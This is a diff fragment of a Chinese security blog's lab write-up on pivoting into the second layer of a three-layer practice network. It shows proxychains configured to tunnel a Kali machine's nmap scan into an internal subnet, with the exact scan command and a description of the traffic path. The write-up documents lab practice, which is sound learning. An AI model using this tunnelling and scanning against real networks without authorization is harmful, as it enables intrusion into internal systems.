+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.55.57.png" alt="原配置" style="zoom:50%;">
+
+<p>修改后的配置：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2014.56.34.png" style="zoom:50%;">
+
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.09.49.png" style="zoom:50%;">
+
+<p>之后便可以使用proxychains将我们攻击机上的程序代理进第二层网络（192.168.52.1/24）了。</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.10.59.png" alt="截屏2025-01-15 17.10.59" style="zoom:50%;">
+
+<p>正常情况下ping内网主机是无法ping通的，但是proxychains不支持icmp协议，所以也没法使用诸如proxychains4 ping 192.168.52.20的命令测试连通性。</p>
+<h3 id="6-2-5-攻击机使用proxychains执行namp"><a href="#6-2-5-攻击机使用proxychains执行namp" class="headerlink" title="6.2.5 攻击机使用proxychains执行namp"></a>6.2.5 攻击机使用proxychains执行namp</h3><p>使用proxychains代理攻击机的流量，实现对二层网络的探测：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-F</span> <span class="token parameter variable">-O</span> <span class="token number">192.168</span>.52.30 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<blockquote>
+<h4 id="大战Bug-「proxychains4-nmap-报错」"><a href="#大战Bug-「proxychains4-nmap-报错」" class="headerlink" title="大战Bug-「proxychains4 nmap  报错」"></a>大战Bug-「proxychains4 nmap  报错」</h4><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2017.15.21.png" style="zoom:40%;">
+
+<p>解决：</p>
+<p>编辑 /etc/proxychains4.conf</p>
+<p>注释掉dns解析代理</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.11.13.png" alt="截屏2025-01-15 16.11.13" style="zoom:50%;">
+
+
+</blockquote>
+<p>重新执行扫描：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.16.08.png" style="zoom:50%;">
+
+<p>扫描结果：</p>
+<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDI0IDI0Ij48Y2lyY2xlIGN4PSI0IiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgaWQ9InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAiIGF0dHJpYnV0ZU5hbWU9InIiIGJlZ2luPSIwO3N2Z1NwaW5uZXJzM0RvdHNTY2FsZTEuZW5kLTAuMjVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjMiIGZpbGw9ImN1cnJlbnRDb2xvciI+PGFuaW1hdGUgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNnMiIGR1cj0iMC43NXMiIHZhbHVlcz0iMzsuMjszIi8+PC9jaXJjbGU+PGNpcmNsZSBjeD0iMjAiIGN5PSIxMiIgcj0iMyIgZmlsbD0iY3VycmVudENvbG9yIj48YW5pbWF0ZSBpZD0ic3ZnU3Bpbm5lcnMzRG90c1NjYWxlMSIgYXR0cmlidXRlTmFtZT0iciIgYmVnaW49InN2Z1NwaW5uZXJzM0RvdHNTY2FsZTAuZW5kLTAuNDVzIiBkdXI9IjAuNzVzIiB2YWx1ZXM9IjM7LjI7MyIvPjwvY2lyY2xlPjwvc3ZnPg==" data-original="/2024/12/31/zong-he-shen-tou/san-ceng-wang-luo-ba-chang-whoami-cong-da-dian-dao-na-xia-yu-kong/%E6%88%AA%E5%B1%8F2025-01-15%2016.17.06.png" style="zoom:50%;">
+
+<p>至此，成功实现借助隧道使用kali的攻击工具探测二层网络内系统信息。</p>
+<p>流量路径大致如下：</p>
+<p>kali（nmap）192.168.43.26——&gt;127.0.0.1:8080——&gt;192.168.43.253:1234——&gt;192.168.52.10——&gt;192.168.52.30</p>
 
                 
             </div>
@@ -801,16 +1044,16 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                                     <span class="chip bg-color">内网攻防</span>
                                 </a>
                             
+                                <a href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
+                                    <span class="chip bg-color">隧道搭建</span>
+                                </a>
+                            
                                 <a href="/tags/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/">
                                     <span class="chip bg-color">综合渗透</span>
                                 </a>
                             
                                 <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
                                     <span class="chip bg-color">域渗透</span>
-                                </a>
-                            
-                                <a href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
-                                    <span class="chip bg-color">隧道搭建</span>
                                 </a>
                             
                                 <a href="/tags/WHOAMI%E9%9D%B6%E5%9C%BA/">
@@ -1004,16 +1247,16 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
                         <span class="chip bg-color">内网攻防</span>
                     </a>
                     
+                    <a href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
+                        <span class="chip bg-color">隧道搭建</span>
+                    </a>
+                    
                     <a href="/tags/%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F/">
                         <span class="chip bg-color">综合渗透</span>
                     </a>
                     
                     <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">
                         <span class="chip bg-color">域渗透</span>
-                    </a>
-                    
-                    <a href="/tags/%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/">
-                        <span class="chip bg-color">隧道搭建</span>
                     </a>
                     
                     <a href="/tags/WHOAMI%E9%9D%B6%E5%9C%BA/">
@@ -1161,7 +1404,7 @@ exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">132.9k</span>
+                        class="white-color">142.6k</span>
             
             
             
